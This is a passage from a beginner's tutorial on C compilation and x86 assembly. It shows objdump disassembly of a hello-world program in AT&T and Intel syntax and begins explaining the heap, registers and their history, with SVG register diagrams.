</span></span><span class="line"><span class="cl"><span class="c1">#   13:   e8 00 00 00 00          call   18 &lt;main+0x18&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   18:   b8 05 00 00 00          mov    $0x5,%eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   1d:   5d                      pop    %rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   1e:   c3                      ret</span>
</span></span></code></pre></div><p>The same results can be obtained from our linked binary, if we only ask <code>objdump</code> to disassemble <code>main()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">objdump --disassemble<span class="o">=</span>main hello_world.out
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 0000000000001139 &lt;main&gt;:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     1139:       55                      push   %rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     113a:       48 89 e5                mov    %rsp,%rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     113d:       48 8d 05 c0 0e 00 00    lea    0xec0(%rip),%rax        # 2004 &lt;_IO_stdin_used+0x4&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     1144:       48 89 c7                mov    %rax,%rdi</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     1147:       b8 00 00 00 00          mov    $0x0,%eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     114c:       e8 df fe ff ff          call   1030 &lt;printf@plt&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     1151:       b8 05 00 00 00          mov    $0x5,%eax</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     1156:       5d                      pop    %rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     1157:       c3                      ret</span>
</span></span></code></pre></div><p>Ofcourse, few things are different like the numbers in first column (these numbers are offset values, we don&rsquo;t need to understand them right now)&hellip;. But if we focus only on the <em>second column</em> and <em>third column</em> which are <a href="https://en.wikipedia.org/wiki/Opcode"><strong>hexa-decimal values or opcodes</strong></a> and <strong>assembly code/representation</strong> respectively.</p>
<p>The main difference between a <code>.o</code> and <code>.out</code> file is that the <code>.o</code> file is not yet linked to any platoform dependent libraries. Here is a <a href="https://stackoverflow.com/questions/58245469/o-vs-out-in-c">good stackoverflow thread</a> about the same topic.</p>
<p>The assembly code has a syntax structure, which is a good point to start understanding how they work. Each line in the above output contains 1 assembly instruction &hellip; and every instruction is composed of either 1, 2 or 3 keywords. These can be represented in below syntax.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## Syntax by Intel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">| Keyword1     | Keyword2   | Keyword3   |
</span></span><span class="line"><span class="cl">|--------------|------------|------------|
</span></span><span class="line"><span class="cl">| OPCODE       | destination| source     |
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    or
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">## Syntax by AT&amp;T
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">| Keyword1     | Keyword2  | Keyword3    |
</span></span><span class="line"><span class="cl">|--------------|-----------|-------------|
</span></span><span class="line"><span class="cl">| OPCODE       | source    | destination |
</span></span></code></pre></div><p>There are few other differences between these 2 syntaxes..but this does not change anything in logic or working of the binary. You can think of them as different kinds of representations for the same thing. Read more from <a href="https://web.mit.edu/rhel-doc/3/rhel-as-en-3/i386-syntax.html">here: AT&amp;T Syntax versus Intel Syntax</a> and <a href="https://stackoverflow.com/questions/8549427/nasm-intel-versus-att-syntax-what-are-the-advantages#8550917">here: StackOverflow - NASM (Intel) versus AT&amp;T Syntax: what are the advantages?</a>. I prefer to use <strong>Intel</strong> syntax and will be using that throughout this article.</p>
<p>By default, <code>objdump</code> provides <em>AT&amp;T</em> syntax but you can explicitely ask it to provide the <em>intel</em> syntax using <code>--disassembler-options=intel</code> flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">objdump --disassemble<span class="o">=</span>main --disassembler-options<span class="o">=</span>intel hello_world.out
</span></span></code></pre></div><p>output</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0000000000001139 &lt;main&gt;:
</span></span><span class="line"><span class="cl">    1139:       55                      push   rbp
</span></span><span class="line"><span class="cl">    113a:       48 89 e5                mov    rbp,rsp
</span></span><span class="line"><span class="cl">    113d:       48 8d 05 c0 0e 00 00    lea    rax,[rip+0xec0]        # 2004 &lt;_IO_stdin_used+0x4&gt;
</span></span><span class="line"><span class="cl">    1144:       48 89 c7                mov    rdi,rax
</span></span><span class="line"><span class="cl">    1147:       b8 00 00 00 00          mov    eax,0x0
</span></span><span class="line"><span class="cl">    114c:       e8 df fe ff ff          call   1030 &lt;printf@plt&gt;
</span></span><span class="line"><span class="cl">    1151:       b8 05 00 00 00          mov    eax,0x5
</span></span><span class="line"><span class="cl">    1156:       5d                      pop    rbp
</span></span><span class="line"><span class="cl">    1157:       c3                      ret
</span></span></code></pre></div><p>The purpose of higher level languages like C is that we don&rsquo;t have to deal with all this assembly code for all things. To effectively use assembly there are a lot of things we need to understand and think continously according to them. With higher level languages, we can write the code more easily and then pass that code to compiler, and that will generate a assembly code and binary file for us to use&hellip;</p>
<h4 id="heap-stack-and-registers">Heap, Stack and Registers</h4>
<p>Every C process (<a href="https://www.geeksforgeeks.org/difference-between-program-and-process/">not program</a>) use many things to work, 4 of them are - Heap, Stack, Registers and Instructions. We have just understood about the instructions in previous section, now let us start with others.</p>
<p><strong>Heap</strong> is one of the memory alocation strategy used for dynamic storage allocations, ie, allocating memory at run time. The actual working of the heap is a bit complex and is out of scope for this article. For now, keep in mind that any calls to <code>malloc</code>, <code>calloc</code> or any other similar kind of function will allocate memory in heap. All objects which have dynamic storage duration are suitable for heap.</p>
<p><strong>Registers</strong> are small storage areas in the processors, which are used by instructions to store multiple values. They can store anything upto their size limits. Different architectures have different size of registers ranging from 8 bit to 64 bit registers. There are even 128, 256, and 512-bit registers. <a href="https://stackoverflow.com/questions/52932539/what-are-the-128-bit-to-512-bit-registers-used-for">Here is a stackoverflow thread</a> for the same.</p>
<p>Back in early days (1972), Intel added few 8-bit general purpose registers to their microprocessors&hellip;general purpose registers are used for general purposes like storing return values, temporary calculation results, etc..</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 112 169"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='16' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='16' y='84' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='16' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='16' y='116' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='16' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='16' y='148' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='68' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='56' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='100' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='56' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='132' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='56' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='96' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='96' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='84' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='96' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='116' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='96' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='96' y='148' fill='currentColor' style='font-size:1em'>┤</text>
</g>

    </svg>
  
</div>
<p>Later these 8-bit registers were updated with 16-bit registers&hellip; This was logically partitioned into two 8-bit registers, maybe to back-support the old systems/softwares that used needed 8 bit registers to work, Anyways, the new registers looked something like this&hellip;</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 512 201"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='48' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='48' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='48' y='116' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='48' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='48' y='148' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='48' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='48' y='180' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='80' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='88' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='68' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='88' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='100' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='88' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='132' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='88' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='164' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='88' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='68' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='96' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='100' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='96' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='132' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='96' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='164' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='96' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='128' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='128' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='148' fill='currentColor' style='font-size:1em'>┼</text>
<text text-anchor='middle' x='128' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='180' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='100' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='164' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='168' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='100' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='208' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='180' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='336' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='336' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='84' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='336' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='148' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='336' y='180' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='84' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='84' fill='currentColor' style='font-size:1em'>─</text>
